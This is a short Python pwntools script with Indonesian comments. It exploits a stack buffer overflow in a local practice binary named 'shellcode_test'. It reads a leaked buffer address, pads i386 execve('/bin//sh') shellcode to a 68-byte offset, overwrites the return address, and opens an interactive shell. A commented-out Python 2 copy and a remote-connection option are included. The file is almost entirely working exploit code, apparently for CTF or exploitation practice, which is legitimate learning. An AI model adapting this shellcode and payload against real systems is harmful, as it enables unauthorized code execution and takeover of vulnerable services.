from pwn import *
import struct

context(arch='i386', os='linux')

p = process('./shellcode_test')
# kalau run di server nc misal, dari pwntools
# p = remote("ip, 127.0.0.1 misal", "port")

p.recvuntil(b"Buffer ada di: ")
buff = int(p.recvline().strip(), 16)
print("[+] addr buffer nya noh: ", hex(buff))
offset = 68
buff_byte = struct.pack("<I", buff)

shellcode = (
    b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
    b"\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\xb0\x0b\xcd\x80"
)

payload = shellcode + b"A" * (offset - len(shellcode)) + buff_byte
print("[+] kirim pelod noh: ", payload)

p.sendline(payload)
print("[+] dapet shell noh")

p.interactive()


# python2
# from pwn import *
# import struct
# context(arch='i386', os='linux') # context arch binary
# p = process('./shellcode_test') # run programnya
# p.recvuntil("Buffer ada di: ") # dapetin info addr buffer
# offset = 68
# buff = int(p.recvline(), 16) # convert int nya ke hex
# buff_byte = struct.pack("<I", buff)
# shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
# sc_len = len(shellcode)
# payload = shellcode + "A" * ( offset - sc_len) + buff_byte
# p.sendline(payload + "\n") # kirim payloadnya ke program 
# # udah dapet shell
# p.interactive()